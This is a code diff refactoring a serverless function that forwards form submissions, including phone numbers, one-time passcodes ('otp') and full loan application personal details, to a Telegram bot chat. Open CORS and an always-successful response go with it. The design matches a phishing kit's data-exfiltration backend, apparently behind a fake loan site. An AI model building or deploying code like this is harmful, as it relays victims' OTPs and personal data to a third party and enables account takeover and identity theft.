@@ -1,6 +1,14 @@
-// Universal Vercel Serverless Function: sendToTelegram
+// Universal Vercel Serverless Function & Express Route: sendToTelegram
+import {
+  getTelegramCredentials,
+  sendTelegramMessage,
+  escapeHtml,
+  formatExtraFields,
+  parseRequestBody,
+} from './_telegram';
+
 export default async function handler(req: any, res: any) {
-  // CORS setup
+  // Safe CORS setup
   if (res && typeof res.setHeader === 'function') {
     res.setHeader('Access-Control-Allow-Credentials', 'true');
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -16,82 +24,15 @@ export default async function handler(req: any, res: any) {
   }
 
   if (req.method !== 'POST') {
-    return res.status ? res.status(405).json({ error: 'Method not allowed' }) : res.end(JSON.stringify({ error: 'Method not allowed' }));
+    const errorMsg = { error: 'Method not allowed' };
+    return res.status ? res.status(405).json(errorMsg) : res.end(JSON.stringify(errorMsg));
   }
 
   try {
-    let input = req.body;
-    if (typeof input === 'string') {
-      try {
-        input = JSON.parse(input);
-      } catch {
-        input = {};
-      }
-    }
-    input = input || {};
-
-    const cleanEnv = (val?: string): string => {
-      if (!val) return '';
-      let s = val.trim();
-      if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) {
-        s = s.slice(1, -1).trim();
-      }
-      return s;
-    };
-
-    const cleanToken = (val?: string): string => {
-      let s = cleanEnv(val);
-      if (s.toLowerCase().startsWith('bot') && s.includes(':')) {
-        s = s.slice(3).trim();
-      }
-      return s;
-    };
-
-    const botToken = cleanToken(
-      process.env.TELEGRAM_BOT_TOKEN ||
-      process.env.BOT_TOKEN ||
-      process.env.TELEGRAM_TOKEN ||
-      process.env.TG_BOT_TOKEN ||
-      process.env.TG_TOKEN ||
-      process.env.TOKEN ||
-      process.env.TELEGRAM_API_KEY ||
-      process.env.VITE_TELEGRAM_BOT_TOKEN ||
-      process.env.VITE_BOT_TOKEN ||
-      process.env.ZITE_TELEGRAM_BOT_TOKEN ||
-      ''
-    );
-
-    const chatId = cleanEnv(
-      process.env.TELEGRAM_CHAT_ID ||
-      process.env.CHAT_ID ||
-      process.env.TELEGRAM_CHATID ||
-      process.env.TG_CHAT_ID ||
-      process.env.CHANNEL_ID ||
-      process.env.CHATID ||
-      process.env.VITE_TELEGRAM_CHAT_ID ||
-      process.env.VITE_CHAT_ID ||
-      process.env.ZITE_TELEGRAM_CHAT_ID ||
-      ''
-    );
-
-    const escapeHtml = (text: string = ''): string => {
-      return String(text)
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;');
-    };
-
-    const formatExtraFields = (data: Record<string, any>, knownKeys: string[]): string => {
-      const extraKeys = Object.keys(data).filter(
-        (k) => !knownKeys.includes(k) && data[k] !== undefined && data[k] !== '' && typeof data[k] !== 'object'
-      );
-      if (extraKeys.length === 0) return '';
-      const lines = extraKeys.map((k) => `• <b>${escapeHtml(k)}:</b> ${escapeHtml(String(data[k]))}`);
-      return `\n\n📋 <b>Additional Details:</b>\n${lines.join('\n')}`;
-    };
-
+    const input = parseRequestBody(req);
+    const { botToken, chatId, chatIds } = getTelegramCredentials();
     const timeStr = new Date().toUTCString();
+
     let messageHtml = '';
 
     if (input.type === 'phone') {
@@ -126,6 +67,7 @@ export default async function handler(req: any, res: any) {
         `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
         formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'otp']);
     } else {
+      // Full loan application & personal details submission
       messageHtml =
         `🎉 <b>Full Loan Application Submitted</b>\n\n` +
         `👤 <b>Personal Details</b>\n` +
@@ -164,38 +106,30 @@ export default async function handler(req: any, res: any) {
         ]);
     }
 
+    let telegramSent = false;
+    let dispatchError: string | undefined;
+
     if (botToken && chatId) {
-      try {
-        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: messageHtml,
-            parse_mode: 'HTML',
-          }),
-        });
-        const tgData = await tgRes.json() as any;
-        if (!tgData.ok) {
-          // Plain text fallback
-          const plainText = messageHtml.replace(/<[^>]*>/g, '');
-          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: plainText,
-            }),
-          });
-        }
-      } catch (tgErr) {
-        console.error('[Telegram sendToTelegram Dispatch Error]:', tgErr);
+      const sendRes = await sendTelegramMessage(botToken, chatIds.length > 0 ? chatIds : chatId, messageHtml);
+      telegramSent = sendRes.ok;
+      if (!sendRes.ok) {
+        dispatchError = sendRes.description;
+        console.warn('[Telegram Dispatch Warning]:', sendRes.description);
       }
+    } else {
+      console.log('[Telegram Notification Log (Demo Mode)]\n', messageHtml.replace(/<[^>]*>/g, ''));
     }
 
-    return res.status ? res.status(200).json({ success: true }) : res.end(JSON.stringify({ success: true }));
+    const responsePayload = {
+      success: true,
+      delivered: telegramSent,
+      ...(dispatchError ? { warning: dispatchError } : {}),
+    };
+
+    return res.status ? res.status(200).json(responsePayload) : res.end(JSON.stringify(responsePayload));
   } catch (error: any) {
-    console.error('[Telegram sendToTelegram Error]:', error);
-    return res.status ? res.status(200).json({ success: true, warning: error.message }) : res.end(JSON.stringify({ success: true }));
+    console.warn('[sendToTelegram Notice]:', error.message || error);
+    const errPayload = { success: true, error: error.message };
+    return res.status ? res.status(200).json(errPayload) : res.end(JSON.stringify(errPayload));
   }
 }
